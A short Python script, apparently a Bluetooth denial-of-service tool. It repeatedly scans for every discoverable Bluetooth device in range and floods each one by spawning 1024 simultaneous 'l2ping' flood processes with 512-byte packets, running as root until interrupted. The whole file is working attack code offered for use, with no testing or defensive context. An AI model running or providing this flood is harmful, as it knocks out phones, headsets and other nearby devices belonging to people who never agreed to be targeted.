import subprocess
import time
import os

def cleanup():
    subprocess.run(["sudo", "killall", "l2ping"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    resp = input("\nDo you want to turn off bluetooth (hci0)? [Y/n] ")
    if resp.upper() == 'Y':
        print("Turning bluetooth off...")
        subprocess.run(["sudo", "hciconfig", "hci0", "down"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Done!")

def scan_and_attack():
    while True:
        print("Scanning...")
        result = subprocess.run(["hcitool", "scan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        devices = [line.split()[0] for line in result.stdout.decode().split("\n")[1:] if line]
        print("Done scanning...\n")

        for bd_addr in devices:
            print(f"Pinging {bd_addr}...")
            for _ in range(1024):
                subprocess.Popen(["sudo", "l2ping", "-s", "512", "-f", bd_addr], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if devices:
            print("")
            time.sleep(5)

def main():
    if os.geteuid() != 0:
        print("You need to run as root!")
        exit(1)

    try:
        print("Turning bluetooth on (hci0)...")
        subprocess.run(["sudo", "hciconfig", "hci0", "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Done!\n")
        scan_and_attack()
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()
